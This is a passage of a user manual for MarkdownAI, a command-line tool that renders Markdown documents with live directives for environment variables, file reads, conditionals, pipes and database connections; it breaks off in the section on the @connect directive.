# MarkdownAI — User Manual

> documentation that cannot lie.

**Version:** 0.0.1  
**Generated:** 2026-05-16

MarkdownAI is a superset of Markdown that makes your documents "live." Instead of writing documentation that drifts from reality the moment your code or data changes, MarkdownAI documents fetch their information directly from the sources that power your application — databases, APIs, the filesystem, environment variables, shell commands — and render fresh, accurate output every time you run them.

The result is documentation that is always current and always honest. When you run `mai render`, the document reflects what your system actually is, not what it was when someone last bothered to update it.

MarkdownAI ships as `mai`, a globally-installed command-line tool. It processes any `.md` file that begins with the `@markdownai` header directive. Everything else in the file is standard Markdown, extended with directives that let you fetch, filter, transform, and display live data. It is organized as a six-package npm monorepo and supports 48 language, security, caching, AI-native, MCP integration, and Claude Code skill context features documented in this manual.

---

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
   - **Core Engine**
   - [Parser — AST Production](#parser--ast-production)
   - [Renderer — Output Format Modules](#renderer--output-format-modules)
   - [Engine — AST Execution](#engine--ast-execution)
   - [CLI Core — mai render, validate, parse, eval](#cli-core--mai-render-validate-parse-eval)
   - **Language Features**
   - [Header Declaration and Runtime Detection](#language--header-declaration-and-runtime-detection)
   - [Inline Interpolation {{ }}](#language--inline-interpolation--)
   - [@env Environment Variables](#language--env-environment-variables)
   - [@define and @call Macros](#language--define-and-call-macros)
   - [File Resolution Model](#language--file-resolution-model)
   - [@include Content Inclusion](#language--include-content-inclusion)
   - [@import Definition Import](#language--import-definition-import)
   - [@if Conditionals and Expression System](#language--if-conditionals-and-expression-system)
   - [Pipe Operator and @render](#language--pipe-operator-and-render)
   - [@list Source Directive](#language--list-source-directive)
   - [@read Source Directive](#language--read-source-directive)
   - [@tree, @date, @count Utility Directives](#language--tree-date-count-utility-directives)
   - [@connect Database Registry](#language--connect-database-registry)
   - [@db Database Query Directive](#language--db-database-query-directive)
   - [@http HTTP Request Directive](#language--http-http-request-directive)
   - [@query Shell Command Directive](#language--query-shell-command-directive)
   - [@phase, @on complete, and @graph](#language--phase-on-complete-and-graph)
   - **Security**
   - [Security Config, Runtime Modes, Audit Log](#security--config-file-runtime-modes-audit-log)
   - [Filesystem Confinement and Content Masking](#security--filesystem-confinement-and-content-masking)
   - [Shell Execution Jail (@query)](#security--shell-execution-jail-query)
   - [Database Query Jail (@db)](#security--database-query-jail-db)
   - [HTTP Request Jail (@http)](#security--http-request-jail-http)
   - [Built-in Immutable Rules](#security--built-in-immutable-rules)
   - **Auxiliary Tooling**
   - [Caching — @cache Modifier System](#caching--cache-modifier-system)
   - [Stripper — mai strip Command](#stripper--mai-strip-command)
   - [MCP Server — AI Integration](#mcp-server--ai-integration)
   - [Hook — PreToolUse AI Routing](#hook--pretooluse-ai-routing)
   - [CLI Complete — All Remaining mai Commands](#cli-complete--all-remaining-mai-commands)
   - **Testing**
   - [E2E Test Suite — Fixture Files and CLI Verification](#e2e-test-suite--fixture-files-and-cli-verification)
   - **AI-Native Features**
   - [AI — Consumer-Targeted Conditional Rendering](#ai--consumer-targeted-conditional-rendering-planned--not-yet-implemented)
   - [AI — @prompt Directive](#ai--prompt-directive-embedded-ai-instructions)
   - [AI — Context Budget, Section Priority, and Chunk Boundaries](#ai--context-budget-section-priority-and-chunk-boundaries-planned--not-yet-implemented)
   - [AI — @define-concept (Inline Glossary Injection)](#ai--define-concept-inline-glossary-injection-planned--not-yet-implemented)
   - [AI — @constraint Directive (Machine-Readable Rules)](#ai--constraint-directive-machine-readable-rules-planned--not-yet-implemented)
   - [AI — Token-Efficient Format Mode](#ai--token-efficient-format-mode---formatai-planned--not-yet-implemented)
   - [AI — E2E Accuracy Tests and Format Benchmarks](#ai--e2e-accuracy-tests-and-format-benchmarks-planned--not-yet-implemented)
   - **MCP End-to-End**
   - [MCP E2E — Protocol Conformance](#mcp-e2e--protocol-conformance)
   - [MCP E2E — All 8 Tools End-to-End](#mcp-e2e--all-8-tools-end-to-end-planned--not-yet-implemented)
   - [MCP E2E — Security Enforcement at MCP Boundary](#mcp-e2e--security-enforcement-at-mcp-boundary-planned--not-yet-implemented)
   - [MCP E2E — AI-Native Integration and Realistic Claude Workflow](#mcp-e2e--ai-native-integration-and-realistic-claude-workflow-planned--not-yet-implemented)
   - **Integration**
   - [MDD + MarkdownAI Integration](#mdd--markdownai-integration)
   - [MDD Token Economics and Accuracy Analysis](#mdd-token-economics-and-accuracy-analysis)
   - [Skill Context Variables — Claude Code Slash Command Integration](#skill-context-variables--claude-code-slash-command-integration)
   - [Shell Inline - Native !`command` Interception](#shell-inline---native-command-interception)
3. [Command Reference](#command-reference)
4. [Configuration Reference](#configuration-reference)

---

## Overview

MarkdownAI solves a problem every team eventually hits: documentation lies. Not on purpose — it just gets old. The database schema changes, the API adds a field, the environment variable gets renamed, but the docs stay frozen at the moment someone last had time to update them.

MarkdownAI fixes this by making documents executable. Add `@markdownai` to the first line of any `.md` file, and it becomes a live document. You can fetch the current state of your database, call an API, read a config file, run a shell command, count source files, or inject an environment variable — all inline, using a readable directive syntax that lives alongside your prose.

The document is rendered with `mai render`. Every directive runs, every data source is queried, and the final output is clean, standard Markdown. Strip the directives away with `mai strip` to get a static export. Or serve the document live to an AI assistant via the built-in MCP server — where lazy phase loading ensures the AI always sees exactly what is relevant right now.

Security is enforced at every layer. Jailed directives (database queries, HTTP calls, shell commands) are blocked by default and must be explicitly allowed. File access is confined to the document root. Content masking prevents credentials from appearing in rendered output. And a set of immutable rules — hardcoded, impossible to override — blocks the most dangerous operations regardless of configuration.

---

## Features

### Core Engine

<!-- mdd-section: 01-parser -->
### Parser — AST Production

The MarkdownAI parser reads your `.md` documents and converts them into a structured representation that the rest of the toolchain can act on. It understands every MarkdownAI directive — from database queries to conditional blocks — so downstream components know exactly what a document is asking for, without anything being executed yet.

#### What It Does

When you run any `mai` command, the parser is the first thing that runs. It reads your document line by line, recognises all special directives (lines starting with `@`), inline expressions (`{{ }}`), pipe chains, graph blocks, and conditional sections, then hands a complete structural map to the rest of the tool. The parser is intentionally inert — it never fetches data, reads files, or touches any external resource. That separation means you can parse a document safely in any environment without side effects.

#### How To Use It

The parser runs automatically whenever you invoke `mai`. You do not call it directly. Any `.md` file must begin with `@markdownai` (optionally followed by a version pin, e.g. `@markdownai v1.0`) on the very first line — if that line is missing, the file is treated as plain Markdown and no further processing occurs.

Write your directives one per line. The parser enforces a small set of structural rules:

- Block directives like `@define`, `@phase`, and `@if` must be closed with `@end` or `@endif`.
- Pipe chains (`@list ./src/ | sort | @render type="list"`) are written on a single line and count as one directive.
- Inside a `@phase` block, `@on complete ->` triggers a transition to another phase or macro.
- Unknown `@directives` are never errors — the parser passes them through untouched.

#### Examples

Start every MarkdownAI document with the header directive:

```
@markdownai v1.0
```

Pin a specific version so the document behaves predictably as the language evolves:

```
@markdownai v1.0

@connect mydb sqlite://./data.db
@query mydb SELECT count(*) FROM orders
```

Use a pipe chain to fetch, transform, and render in one line:

```
@list ./src/ | sort | @render type="list"
```

Use an inline expression anywhere in prose:

```
This report was generated on {{ @date format="YYYY-MM-DD" }}.
```

<!-- /mdd-section: 01-parser -->

<!-- mdd-section: 02-renderer -->
### Renderer — Output Format Modules

The Renderer takes data from your document's live data sources and turns it into clean, readable markdown. It supports eleven different output formats — from simple lists and tables to ASCII charts — so your documents look great everywhere: terminals, AI tools, email, and plain text viewers alike.

#### What It Does

When your `mai` document fetches data from a database, API, or pipeline, the Renderer decides how to display it. You choose a format — table, bar chart, tree, timeline, and more — and the Renderer produces fully-formatted markdown output automatically. Every visualization is rendered in plain ASCII, meaning no external charting libraries, no JavaScript, and no browser required. Your documents render correctly in any context that can display text.

#### How To Use It

In your MarkdownAI document, specify the output format in your data block using the `type` field. The Renderer will automatically handle the rest when `mai` processes the document.

Available format types:

| Format | What It Produces |
|---|---|
| `list` | Unordered bullet list |
| `numbered` | Ordered numbered list |
| `links` | List of clickable markdown links |
| `table` | Grid table with headers and rows |
| `code` | Fenced code block (language auto-detected) |
| `inline` | Plain text, no wrapping — for embedding a value in a sentence |
| `bar` | Horizontal ASCII bar chart |
| `flow` | ASCII flow diagram with arrows between steps |
| `tree` | ASCII indented tree for nested data |
| `timeline` | Left-to-right ASCII timeline |
| `json` | Pretty-printed JSON in a fenced code block |

#### Examples

Render a query result as a table:
```
type: table
```

Render numeric data as a horizontal bar chart:
```
type: bar
```

Render a process or workflow as a flow diagram:
```
type: flow
```

Embed a single scalar value directly into surrounding text:
```
type: inline
```

<!-- /mdd-section: 02-renderer -->

<!-- mdd-section: 03-engine -->
### Engine — AST Execution

The Engine is the brain of MarkdownAI — it reads your document, runs every live directive in it, and assembles the final output. It solves the core problem of making a document "execute": fetching data, evaluating conditions, expanding macros, and running pipelines all happen here, in the right order, every time.

#### What It Does

When you run `mai`, the Engine takes your parsed document and walks through it from top to bottom, resolving each piece into its final value. Environment variables are looked up in a predictable priority order (system environment first, then any `--env` file you provide, then fallbacks declared in your imports, then inline fallbacks, then blank). Macros you define with `@define` get expanded wherever they are called. Conditional blocks (`@if`) are evaluated and only the matching branch is included in the output. Data pipelines run their stages in sequence — filtering, sorting, slicing — and return the final result. The Engine also manages caching so repeated runs avoid redundant fetches.

#### How To Use It

The Engine runs automatically whenever you execute any `mai` command — you do not invoke it directly. Everything you write in your `.md` document (directives, macros, conditionals, pipes) is processed by the Engine at render time.

To control which section of a document runs, use phases. Define phases in your document and pass the active phase when running `mai` — only nodes tagged for that phase (or untagged nodes) will execute.

Caching is built in. Session cache keeps results in memory for the duration of a single run. Persistent cache saves results to disk so subsequent runs skip unchanged fetches. Pass a `cache=` option on any directive to opt in, or use `mock=` to replay a saved response without hitting the real source.

#### Examples

Run a document and let the Engine resolve all directives automatically:
```
mai render my-report.md
```

Run only a specific phase of a document:
```
mai render my-report.md --phase production
```

Override environment variables for a run:
```
mai render my-report.md --env .env.staging
```

Use an inline fallback so a missing variable never causes an error:
```
@{MY_VAR fallback=default-value}
```

<!-- /mdd-section: 03-engine -->

<!-- mdd-section: 04-cli-core -->
### CLI Core — mai render, validate, parse, eval

The `mai` command is the entry point for all MarkdownAI operations. It gives you four essential commands to render live documents, check them for errors, inspect their structure, and test expressions — all from your terminal.

#### What It Does

The CLI turns MarkdownAI documents into useful output without requiring any code. You can render a document to see its final result with all data fetched and directives resolved, validate a document to catch problems before sharing it, inspect the raw parsed structure as JSON for debugging, or quickly evaluate a single expression against your environment. Every command shares a common set of flags so the experience is consistent regardless of what you're doing.

#### How To Use It

Run any command with `mai <command> <file>`. All commands accept a shared set of flags:

- `--env <file>` — load a `.env` file to supply environment variables to the document
- `--cwd <path>` — run as if you were in a different directory
- `--verbose` — show warnings in the terminal output
- `--strict` — treat warnings as errors and stop on any security issue
- `--silent` — suppress all output except fatal errors and security alerts

For `mai render`, add `-o <path>` to write the result to a file instead of printing to the terminal.

For `mai parse`, add `--node <type>` to filter results to a specific node type, and `--pretty` to format the JSON output for readability.

For `mai eval`, pass an expression in quotes directly as the argument instead of a file path.

#### Commands

| Command | Description | Flags |
|---------|-------------|-------|
| `mai render <file>` | Executes the document and prints the fully rendered markdown to stdout | `-o <path>` to write to a file |
| `mai validate <file>` | Checks the document for errors and warnings without producing output; exits with code 1 if errors are found | `--strict` to treat warnings as errors |
| `mai parse <file>` | Parses the document and outputs its internal structure as JSON | `--node <type>`, `--pretty` |
| `mai eval "<expression>"` | Evaluates a single expression against the current environment and prints the result | `--env <file>` |

#### Examples

Render a document and save the result to a file:
```
mai render report.md -o output.md
```

Check a document for problems before sharing it, treating all warnings as errors:
```
mai validate report.md --strict
```

Test whether a directory exists in your project:
```
mai eval "file.exists './src/enterprise/'"
```

<!-- /mdd-section: 04-cli-core -->

---

### Language Features

<!-- mdd-section: 05-lang-header -->
### Language — Header Declaration and Runtime Detection

Every MarkdownAI document begins with a single line — `@markdownai` — that tells the `mai` tool this file is live. This opt-in mechanism requires no special file extension, no config file, and no sidecar. The first line is the contract.

#### What It Does

When you open a `.md` file, `mai` checks whether line 1 starts with `@markdownai`. If it does, the file is treated as a live MarkdownAI document and all its dynamic features — data fetching, pipelines, AI rendering — become active. If that line is absent, `mai` treats the file as plain Markdown and does nothing special. You can also pin a language version (e.g. `@markdownai v1.0`) so the document declares exactly which MarkdownAI features it expects; if your installed version is older, `mai` warns you but continues running.

#### How To Use It

To make any Markdown file live, add `@markdownai` as the very first line — before any blank lines, headings, or other content. That single addition is all it takes.

To pin a specific version, append the version after the declaration: `@markdownai v1.0`. This is optional but recommended for documents that depend on specific language features.

To remove MarkdownAI from a file, delete line 1. The rest of the document stays untouched.

#### Examples

Enable MarkdownAI with no version pin:
```
@markdownai

# My Document
```

Enable MarkdownAI and pin to version 1.0:
```
@markdownai v1.0

# My Document
```

Remove MarkdownAI from a document (delete only line 1):
```
# My Document   ← now the first line; file is plain Markdown again
```

<!-- /mdd-section: 05-lang-header -->

<!-- mdd-section: 06-lang-interpolation -->
### Language — Inline Interpolation `{{ }}`

Inline interpolation lets you embed live values directly inside your prose using double curly braces. Instead of writing static text that goes stale, you pull in real data — environment variables, dates, file contents, or computed values — right where the words are.

#### What It Does

Anywhere in your document, you can wrap an expression in `{{ }}` and `mai` replaces it with the live result when the document renders. This works inside paragraphs, headings, list items, and table cells. It does not activate inside code blocks or inline code spans, so your code examples stay untouched. If an expression cannot be resolved, it quietly becomes an empty string and logs a warning — your document still renders cleanly.

#### How To Use It

Write `{{ expression }}` inline wherever you want a live value to appear. The expression can reference environment variables, read files, count files matching a pattern, format dates, or test whether a file exists. You can also use conditional logic inline: a ternary `condition ? "yes" : "no"` picks between two values, `??` provides a fallback if the value is missing, and `?.` safely chains into optional properties. To render a literal `{{` in your output, escape it as `\{{`.

#### Examples

Show the current year inline:
```
This report was generated in {{ date format="YYYY" }}.
```

Use an environment variable with a fallback:
```
API endpoint: {{ env.API_URL ?? "http://localhost:3000" }}
```

Switch text based on whether a file exists:
```
Running in {{ file.exists "./config/prod.json" ? "production" : "development" }} mode.
```

Show the version from `package.json`:
```
Current version: {{ read ./package.json path="version" }}
```

<!-- /mdd-section: 06-lang-interpolation -->

<!-- mdd-section: 07-lang-env -->
### Language — @env Environment Variables

`@env` lets your MarkdownAI documents read environment variables directly — so sensitive values like API keys, database URLs, or deployment settings never have to be hardcoded in your documents. You can provide fallback values for when a variable isn't set, keeping your documents functional across different environments.

#### What It Does

When you use `@env` in a document, MarkdownAI looks up the named environment variable and inserts its value. You can use it as a standalone line to output a value as its own paragraph, or embed it inline within prose using `{{ env.VARNAME }}`. You can also declare expected variables (with optional fallbacks) inside shared import files, which lets you define configuration defaults in one place and reuse them across many documents. If a variable is missing and no fallback was provided, `mai validate` will warn you before the document is rendered.

#### How To Use It

**Output a variable as a paragraph:**
Place `@env VARNAME` on its own line. The variable's value appears as a paragraph in the rendered output. Add a fallback with `fallback="your-default"` so the document still renders if the variable is unset.

**Embed a variable inline:**
Use `{{ env.VARNAME }}` inside a sentence or paragraph to insert the value mid-prose.

**Declare variables in a shared import file:**
In a file you `@import` into other documents, write `@env VARNAME fallback="default-value"`. This registers the fallback for the entire document that imports it — no output is produced in the import file itself, only the registration. Variables declared without a fallback are flagged during `mai validate` if they are unset.

**Variable resolution order:**
When resolving a variable, `mai` checks these sources in order and uses the first match:
1. Your shell environment (always wins)
2. An env file passed with `--env .env.production` (or similar)
3. Fallbacks registered via `@import` files
4. The `fallback=` value on the directive itself
5. An empty string (no error is thrown)

#### Examples

Output an API base URL as a paragraph, with a fallback:
```
@env API_BASE_URL fallback="https://api.example.com"
```

Embed a variable inline within prose:
```
The current deployment target is {{ env.DEPLOY_ENV }}.
```

Declare a default in a shared config import file:
```
@env DATABASE_URL fallback="postgres://localhost:5432/mydb"
```

Pass a custom env file when rendering:
```
mai render report.md --env .env.production
```

<!-- /mdd-section: 07-lang-env -->

<!-- mdd-section: 08-lang-macros -->
### Language — @define and @call Macros

Macros let you define reusable content blocks once and insert them anywhere in your document — with or without parameters. This eliminates copy-pasting repeated content and keeps documents consistent when shared values change.

#### What It Does

The `@define` directive creates a named block of content — anything from a static paragraph to a fully dynamic section with database queries or environment variables. The `@call` directive inserts that block wherever you need it, optionally passing values to fill in placeholders inside the block. Macros are not rendered at the point of definition; they only produce output when called. You can also mark a macro as `@local` to keep it scoped to the file that defines it, or leave it global so it is available across all files in the document.

#### How To Use It

1. Define a macro at the top of your document (or in any included file) using `@define`, followed by a name and optional parameters in parentheses.
2. Write the macro body — any content, including other directives — and close it with `@end`.
3. Use `@call` anywhere you want that content to appear, passing arguments if the macro has parameters.
4. Use `{{ param || "default value" }}` inside the macro body to provide fallback values for parameters that are not passed at call time.
5. Add `@local` after the macro name to restrict the macro to the current file and its children.

#### Examples

**Simple macro with no parameters:**
```
@define disclaimer
This report is generated automatically and may contain estimates.
@end

@call disclaimer
```

**Macro with parameters and a default:**
```
@define greeting(name, role)
Hello, {{ name || "reader" }}. Your role is {{ role || "viewer" }}.
@end

@call greeting(name=Alice, role=Admin)
@call greeting(name=Bob)
```

**Local-scoped macro (not shared with other files):**
```
@define internal-note @local
For internal review only — do not distribute.
@end

@call internal-note
```

<!-- /mdd-section: 08-lang-macros -->

<!-- mdd-section: 09-lang-file-resolution -->
### Language — File Resolution Model

When your documents include or import other files, MarkdownAI carefully tracks which files have already been processed. This prevents infinite loops caused by circular references, and ensures that diamond dependencies — where two files both pull in the same third file — are handled predictably without duplication or errors.

#### What It Does

As MarkdownAI processes your documents, it keeps a running record of which files are currently being resolved and which have already finished. This lets it catch the moment a file tries to include itself (directly or through a chain of other files), and it knows whether a file that appears more than once should be skipped or rendered again depending on how it was referenced.

#### How To Use It

This feature works automatically — you do not need to configure anything. Simply use `@include` and `@import` directives in your documents as normal. If a circular reference is detected, processing stops immediately with a clear error message showing the full chain of files involved and the exact line where the cycle occurs. If a file is imported more than once, the second occurrence is silently skipped. If a file is included more than once, it renders at each call site — intentional repetition is fully supported.

#### Examples

**Circular reference — will halt with an error:**
```
a.md includes b.md, and b.md imports a.md
→ ERROR: Circular reference detected
    a.md (line 5)  @include b.md
    b.md (line 12) @import  a.md  ← cycle here
    Chain: a.md → b.md → a.md
```

**Diamond dependency with @import — second occurrence is skipped silently:**
```
a.md imports shared.md
b.md imports shared.md
c.md imports a.md and b.md
→ shared.md definitions are registered once; the second @import is a no-op
```

**Diamond dependency with @include — renders at both sites:**
```
page.md includes header.md twice (or via two different paths)
→ header.md content appears at both locations — this is intentional and valid
```

<!-- /mdd-section: 09-lang-file-resolution -->

<!-- mdd-section: 10-lang-include -->
### Language — @include Content Inclusion

The `@include` directive pulls another Markdown file's content directly into your document at the point where you write it. This lets you break large documents into reusable pieces and share macro and connection definitions across files without duplicating them.

#### What It Does

When you include a file, its full rendered content appears inline in your document — as if you had written it there yourself. Any macros, connections, or environment fallbacks defined in the included file automatically become available to the rest of your parent document too. This "bubble-up" of definitions means you can keep shared configuration in a single file and include it wherever it is needed.

#### How To Use It

Write `@include` followed by a relative path to the file you want to pull in. The path must be relative to the file that contains the directive — absolute paths and paths that navigate above your document root are blocked for security reasons. To conditionally include content, wrap `@include` inside an `@if` block rather than adding a condition directly on the `@include` line.

To keep definitions from leaking into the parent document, mark them `@local` inside the included file. You can also control caching behaviour by adding a `@cache` modifier (`session`, `persist`, `ttl`, or `mock`) as the last token on the line.

#### Examples

Include a shared configuration file:
```
@include ./shared/config.md
```

Include a file and cache its output for the session:
```
@include ./data/metrics.md @cache session
```

Conditionally include enterprise-only content using an `@if` block:
```
@if env.TIER == "enterprise"
  @include ./sections/enterprise-features.md
@end
```

<!-- /mdd-section: 10-lang-include -->

<!-- mdd-section: 11-lang-import -->
### Language — @import Definition Import

The `@import` directive lets you share reusable definitions — macros, database connections, and environment variable defaults — across multiple documents from a single source file. It solves the problem of duplicating setup code in every document that needs the same connections or macros.

#### What It Does

When you import a file, `mai` reads it and pulls in everything defined inside it: macros (`@define`), connection settings (`@connect`), and environment variable fallbacks (`@env`). Only those definitions are brought into your current document — no content from the imported file ever appears in your output. This lets you maintain a central "definitions library" and keep your working documents clean.

#### How To Use It

Add an `@import` line near the top of your document, pointing to the file you want to pull definitions from. Use a path relative to the current file. All macros, connections, and environment fallbacks defined in that file become available to the rest of your document immediately.

To avoid re-parsing the same file multiple times in a session, add `@cache session` on the same line.

#### Examples

Import a shared definitions file:
```
@import ./shared/connections.md
```

Import with session caching to avoid redundant re-parsing:
```
@import ./shared/connections.md @cache session
```

Import a definitions library stored one level up:
```
@import ../config/env-defaults.md
```

<!-- /mdd-section: 11-lang-import -->

<!-- mdd-section: 12-lang-conditionals -->
### Language — @if Conditionals and Expression System

Show or hide sections of your document based on conditions — environment, file existence, or data values. This feature lets a single document serve multiple audiences or environments without maintaining separate copies.

#### What It Does

MarkdownAI's conditional system lets you wrap any block of content in `@if`/`@elseif`/`@else`/`@endif` tags. When the document is rendered or stripped, only the blocks whose conditions are true appear in the output. The same expression syntax — operators, file checks, and logical combinators — works everywhere in MarkdownAI: inside `@if` conditions, `where` filters on data queries, and interpolation expressions. Learn the operators once and they work throughout.

#### How To Use It

Wrap content in an `@if` block using any supported condition. Chain additional branches with `@elseif`, provide a fallback with `@else`, and close every block with `@endif`. Nesting is fully supported — inner `@if` blocks are matched to their own `@endif`.

Before stripping or rendering a document that uses conditionals, always supply your environment file so variables resolve correctly:

```
mai strip --env .env.production my-doc.md
```

Run `mai validate` first to catch any unset variables before they silently evaluate to false.

#### Examples

**Show content only in production:**
```markdown
@if env.APP_ENV == "production"
This section only appears in production builds.
@else
You are viewing a non-production build.
@endif
```

**Check whether a file exists:**
```markdown
@if file.exists "./config/custom.json"
Custom configuration detected.
@elseif file.isDir "./config"
Config directory found but no custom.json.
@else
No configuration found.
@endif
```

**Combine conditions with logical operators:**
```markdown
@if env.ROLE == "admin" && env.REGION == "us-east"
Admin dashboard — US East region
@endif
```

<!-- /mdd-section: 12-lang-conditionals -->

<!-- mdd-section: 13-lang-pipeline -->
### Language — Pipe Operator and @render

The pipe operator lets you chain data sources through filtering and transformation steps before rendering the result — all inside a single document line. This brings Unix-style composability to your MarkdownAI documents, keeping data fresh and the logic readable.

#### What It Does

The pipe operator (`|`) connects a data-fetching directive to one or more transform steps, then to a final `@render` sink that controls how the output appears in your document. You can filter, sort, slice, and shape data before it ever hits the page. Built-in transforms like `grep`, `sort`, `head`, and `tail` run as pure cross-platform code — no shell required — so your documents work the same on Windows, macOS, and Linux. If you need more power, shell utilities like `awk`, `jq`, or `sed` are also supported on Unix and WSL.

#### How To Use It

Build a pipe expression on a single line: start with a source directive, add one or more transform commands separated by `|`, and end with either `@render` (to format the output) or a command whose result gets inlined directly as a value.

For `@render`, specify a `type` to control the output format. Available types are: `list`, `numbered`, `links`, `table`, `code`, `inline`, `bar`, `flow`, `tree`, `timeline`, and `json`.

As a shortcut, you can add `as="type"` directly on any source directive — this is equivalent to appending `| @render type="type"` at the end of the pipe.

If you skip `@render` and end the pipe with a command (for example `wc -l`), the raw output is inlined as a plain scalar value — useful for embedding a live count or single value mid-sentence.

On Windows without WSL, shell-dependent commands (`awk`, `sed`, `jq`, etc.) are automatically skipped with a warning rather than crashing. Run `mai validate` to check your document for platform compatibility issues before sharing.

#### Examples

Filter a file list to only TypeScript files and render as a numbered list:
```
@list ./src/ | grep \.ts$ | sort | @render type="numbered"
```

Count the number of source files and inline the result:
```
There are @list ./src/ | wc -l files in this project.
```

Use the `as` shorthand to render a data source directly as a table:
```
@query db="mydb" sql="SELECT name, status FROM tasks" as="table"
```

<!-- /mdd-section: 13-lang-pipeline -->

<!-- mdd-section: 14-lang-sources-list -->
### Language — @list Source Directive

The `@list` directive makes it easy to pull live data into your documents from files on disk, JSON files, and CSV files. Instead of copying and pasting static snapshots, your document reads the real data every time it renders, so it can never drift out of sync.

#### What It Does

`@list` is the primary way to enumerate things in a MarkdownAI document. You can list files and folders matching a pattern, pull items out of a JSON array or object, or read rows from a CSV file. The results appear directly in your document as a table, list, or any other format you choose. You can filter, reshape, and slice the data using built-in options — no scripting required.

#### How To Use It

Add an `@list` line to your document, specifying the file or folder you want to read. Control what gets included using the options described below. For structured data (JSON, CSV), use `where` to filter rows and `columns` to pick which fields appear. Use `as` to control how the output is rendered (for example, as a table or a list). Add `@cache` at the end of the line to cache the result across renders.

#### Configuration

| Option | What It Controls | Example Values | Default |
|---|---|---|---|
| `match` | Glob pattern for filesystem listing | `**/*.ts`, `*.md` | `*` |
| `type` | Whether to list files, directories, or both | `files`, `dirs`, `both` | `files` |
| `depth` | How many folder levels deep to search | Any number | Unlimited |
| `path` | Which part of a JSON file to read | Dot-notation key, e.g. `users` | Root of file |
| `mode` | How to read a JSON object | `keys`, `values`, `entries` | None |
| `columns` | Which fields to show and what to label them | `key:Label,key2:Label2` | All fields |
| `where` | Filter rows by a field value | `status:active` | None (show all) |
| `skip` | Number of header rows to skip in a CSV | Any number | `0` |
| `collapse` | Flatten nested data to a single value | `true` | `false` |
| `as` | Output format shorthand | `table`, `list` | None |
| `@cache` | Cache the result to avoid re-reading | `session`, `persist`, `ttl=60` | None |

#### Examples

List all TypeScript files under a `src/` folder:
```
@list ./src/ match="**/*.ts" type="files"
```

Show users from a JSON file, filtered to active ones, as a table:
```
@list ./data/users.json path="users" where="status:active" as="table"
```

List all dependencies from `package.json` as key-value pairs:
```
@list ./package.json path="dependencies" mode="entries" columns="key:Package,value:Version"
```

Read rows from a CSV and show only selected columns:
```
@list ./data/products.csv columns="sku:SKU,name:Product,price:Price" where="inStock:true"
```

<!-- /mdd-section: 14-lang-sources-list -->

<!-- mdd-section: 15-lang-sources-read -->
### Language — @read Source Directive

The `@read` directive lets you pull real data from structured files directly into your documents. Instead of copying and pasting values that go stale, your document reads them live from JSON, YAML, TOML, CSV, or `.env` files every time it renders.

#### What It Does

When you use `@read` in a document, `mai` opens a structured data file, extracts the values you specify, and renders them inline. You can pull a single value, an entire table, a filtered subset of rows, or a specific column — all without writing any code. The document always reflects what's actually in the file, so your data and your documentation stay in sync automatically.

#### How To Use It

Add an `@read` directive to your document and point it at a file. Choose the access option that matches your file format:

- For **JSON, YAML, and TOML** files, use `path=` with dot-notation to navigate into the data (e.g., `path="servers[0].host"` to reach a nested value).
- For **CSV** files, use `column=` to extract a single column, `where=` to filter rows by a condition, and `columns=` to select and rename multiple fields.
- For **.env** files, use `key=` to look up a single environment variable by name. Using `path=` on a `.env` file is an error.

You can also use `as=` to control how the output is rendered, `collapse true` to flatten nested objects into a single line, and `@cache` to avoid re-reading the file on every render.

`mai` enforces filesystem confinement and content masking, so sensitive values are protected according to your security settings.

#### Configuration

| Option | Applies To | Description |
|---|---|---|
| `path="dot.notation"` | JSON, YAML, TOML | Navigate to a nested value using dot-notation and `[n]` array indices |
| `key="KEY_NAME"` | .env | Look up a single flat key |
| `column="name"` | CSV | Extract one column; outputs one value per line |
| `where=` | CSV | Filter rows using an expression |
| `columns="key:Label,..."` | CSV | Select and rename multiple columns |
| `collapse true` | Any | Stringify nested objects inline |
| `as="type"` | Any | Control output rendering format |
| `@cache` | Any | Cache the file read result |

#### Examples

Read a single value from a JSON config file:
```
@read config.json path="database.host"
```

Render a CSV as a filtered table showing only active users:
```
@read users.csv where="status='active'" columns="name:Name,email:Email"
```

Pull an environment variable from a `.env` file:
```
@read .env key="API_BASE_URL"
```

<!-- /mdd-section: 15-lang-sources-read -->

<!-- mdd-section: 16-lang-sources-utilities -->
### Language — @tree, @date, @count Utility Directives

Three built-in utility directives let your documents automatically display live directory structures, inject current or file-modified dates, and count files — all without any external scripts or manual updates. Together they solve the problem of documentation that goes stale the moment something on disk changes.

#### What It Does

The `@tree` directive renders a visual ASCII directory tree directly in your document, always reflecting the actual state of your filesystem. The `@date` directive stamps your document with the current date and time, or looks up when a specific file was last modified. The `@count` directive tallies how many files or folders match a pattern in a given directory — useful for showing metrics like "47 TypeScript files in this package" without ever touching the number by hand.

#### How To Use It

Place any of the three directives on its own line in your MarkdownAI document. When `mai` renders the document, each directive is replaced with live output.

**@tree** — show a directory listing:
```
@tree ./src/ depth=2 match="*.ts"
```
Use `depth` to limit how many folder levels are shown, and `match` to filter by file pattern.

**@date** — insert a date or timestamp:
```
@date format="YYYY-MM-DD"
@date file="./CHANGELOG.md" type="modified"
```
Use `format` to control how the date looks. Use `file` + `type="modified"` to show when a specific file was last changed.

**@count** — count files or directories:
```
@count ./src/ match="**/*.ts" type=files
```
Use `type=files`, `type=dirs`, or `type=both` to control what gets counted.

All three directives also work inline inside double-curly-brace expressions:
```
There are {{ count ./src/ match="**/*.ts" }} TypeScript files.
Last updated: {{ date format="YYYY-MM-DD" }}.
```

#### Examples

Show the top two levels of a project's source folder, filtered to TypeScript files only:
```
@tree ./packages/ depth=2 match="*.ts"
```

Stamp a document with today's date in ISO format:
```
@date format="YYYY-MM-DD"
```

Display a live file count inline within a sentence:
```
This package contains {{ count ./src/ match="**/*.ts" }} source files.
```

<!-- /mdd-section: 16-lang-sources-utilities -->

<!-- mdd-section: 17-lang-connect -->
### Language — @connect Database Registry

The `@connect` directive lets you define named database connections once at the top of a document and reuse them by name throughout. This keeps your credentials out of the document body and makes it safe to commit your files — connections always reference environment variables, never hardcoded secrets.

#### What It Does

`@connect` acts as a connection registry for your document. You declare each database connection — giving it a name, a type, and an environment variable that holds the URI — and then any `@db` query block in the document can refer to it by name. You can also scope a connection locally to a single included file using the `@local` modifier, preventing it from leaking into the parent document.

#### How To Use It

1. At the top of your document, declare each connection you need using `@connect`, giving it a name, a database type, and a reference to an environment variable that holds the connection string.
2. In your `@db` query blocks, reference the connection by name using `using="name"`. If you only have one connection defined, `@db` will use it automatically.
3. Use the `@local` modifier on any connection that should stay private to the current file and not be visible to parent documents that include it.
